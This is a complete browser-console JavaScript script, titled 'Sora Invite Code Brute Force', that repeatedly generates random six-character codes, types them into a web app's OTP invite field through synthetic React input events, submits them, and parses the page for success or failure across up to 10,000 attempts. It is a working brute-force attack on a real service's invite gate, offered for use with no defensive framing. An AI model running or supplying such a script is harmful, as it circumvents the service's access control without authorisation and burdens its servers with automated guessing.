// Configuration
const DELAY_MS = 1500;
const MAX_ATTEMPTS = 10000;
const VALIDATION_TIMEOUT = 6000;
const ELEMENT_RETRY_TIMEOUT = 5000;
let attempts = 0;
let isRunning = true;

// Generate random 6-character alphanumeric code
function generateCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return Array.from({ length: 6 }, () => 
    chars[Math.floor(Math.random() * chars.length)]
  ).join('');
}

// Wait for element to appear with timeout
async function waitForElement(selector, timeout = ELEMENT_RETRY_TIMEOUT) {
  const startTime = Date.now();
  
  while (Date.now() - startTime < timeout) {
    const element = document.querySelector(selector);
    if (element) return element;
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  return null;
}

// Get OTP input element
async function getOTPInput() {
  return await waitForElement('input[data-input-otp="true"]', 3000);
}

// Get submit button element
async function getSubmitButton() {
  const buttons = Array.from(document.querySelectorAll('button'));
  const btn = buttons.find(b => 
    b.textContent.includes('Join') && !b.querySelector('svg')
  );
  return btn || await waitForElement('button', 3000);
}

// Type code into input field (React-compatible)
async function typeCode(input, code) {
  const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
    window.HTMLInputElement.prototype,
    'value'
  ).set;
  
  input.focus();
  
  // Clear existing value
  nativeInputValueSetter.call(input, '');
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await new Promise(resolve => setTimeout(resolve, 50));
  
  // Type each character
  for (let i = 0; i < code.length; i++) {
    const partial = code.substring(0, i + 1);
    nativeInputValueSetter.call(input, partial);
    
    input.dispatchEvent(new InputEvent('input', {
      bubbles: true,
      cancelable: true,
      data: code[i],
      inputType: 'insertText'
    }));
    
    await new Promise(resolve => setTimeout(resolve, 30));
  }
  
  input.dispatchEvent(new Event('change', { bubbles: true }));
}

// Check if current code is invalid
function checkInvalidState() {
  const input = document.querySelector('input[data-input-otp="true"]');
  if (!input) return null;
  
  if (input.getAttribute('aria-invalid') === 'true') {
    return 'invalid';
  }
  
  const slots = document.querySelectorAll('[data-slot="input-otp-slot"]');
  for (const slot of slots) {
    if (slot.getAttribute('aria-invalid') === 'true') {
      return 'invalid';
    }
  }
  
  const buttons = Array.from(document.querySelectorAll('button'));
  for (const btn of buttons) {
    const text = btn.textContent.toLowerCase();
    if (text.includes('invalid') || text.includes('error')) {
      return 'invalid';
    }
  }
  
  return null;
}

// Wait for dialog to be ready for next attempt
async function waitForDialogReady() {
  const startTime = Date.now();
  
  while (Date.now() - startTime < 5000) {
    const dialog = document.querySelector('[role="dialog"][data-state="open"]');
    if (!dialog) return false;
    
    const input = document.querySelector('input[data-input-otp="true"]');
    const button = document.querySelector('button');
    
    if (input && button) {
      if (input.getAttribute('aria-invalid') !== 'true') {
        return true;
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  return false;
}

// Wait for validation response from server
async function waitForValidation() {
  const startTime = Date.now();
  
  while (Date.now() - startTime < VALIDATION_TIMEOUT) {
    const dialog = document.querySelector('[role="dialog"][data-state="open"]');
    if (!dialog) return 'success';
    
    const invalidCheck = checkInvalidState();
    if (invalidCheck === 'invalid') return 'invalid';
    
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  
  return 'timeout';
}

// Main execution function
async function tryRandomCodes() {
  console.clear();
  console.log('Sora Invite Code Brute Force');
  console.log('========================================');
  console.log('');
  
  // Verify elements exist before starting
  const testInput = await getOTPInput();
  const testButton = await getSubmitButton();
  
  console.log('Pre-flight check:');
  console.log(`  Input element: ${testInput ? 'Found' : 'Not found'}`);
  console.log(`  Submit button: ${testButton ? 'Found' : 'Not found'}`);
  
  if (!testInput || !testButton) {
    console.error('\nError: Required elements not found.');
    console.error('Please ensure the invite dialog is open and try again.');
    return;
  }
  
  console.log('\nInitializing...\n');
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  while (isRunning && attempts < MAX_ATTEMPTS) {
    attempts++;
    const code = generateCode();
    
    // Verify dialog is still open
    const dialog = document.querySelector('[role="dialog"][data-state="open"]');
    if (!dialog) {
      console.log('Dialog closed. Stopping execution.');
      break;
    }
    
    console.log(`[Attempt ${attempts}] Testing code: ${code}`);
    
    // Wait for dialog to be ready
    const isReady = await waitForDialogReady();
    
    if (!isReady) {
      console.log('  Error: Dialog not ready. Stopping execution.');
      break;
    }
    
    // Get fresh element references
    const input = await getOTPInput();
    const button = await getSubmitButton();
    
    if (!input || !button) {
      console.error('  Error: Elements not found. Stopping execution.');
      break;
    }
    
    // Enter the code
    try {
      await typeCode(input, code);
      await new Promise(resolve => setTimeout(resolve, 150));
      
      if (input.value !== code) {
        console.log(`  Warning: Value mismatch. Expected "${code}", got "${input.value}"`);
        continue;
      }
      
      console.log(`  Status: Code entered successfully`);
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // Submit the code
      console.log('  Status: Submitting...');
      button.click();
      
      // Wait for server response
      const result = await waitForValidation();
      
      if (result === 'success') {
        console.log('\n========================================');
        console.log('SUCCESS');
        console.log(`Valid code found: ${code}`);
        console.log(`Total attempts: ${attempts}`);
        console.log('========================================');
        isRunning = false;
        break;
      } else if (result === 'invalid') {
        console.log('  Result: Invalid code');
      } else {
        console.log('  Result: Timeout (assuming invalid)');
      }
      
    } catch (error) {
      console.error(`  Error: ${error.message}`);
    }
    
    console.log('');
    await new Promise(resolve => setTimeout(resolve, DELAY_MS));
  }
  
  console.log(`\nExecution complete. Total attempts: ${attempts}`);
  
  if (attempts >= MAX_ATTEMPTS) {
    console.log('Maximum attempt limit reached.');
  }
}

// Execute
console.log('Type "isRunning = false" to stop execution at any time.');
tryRandomCodes();
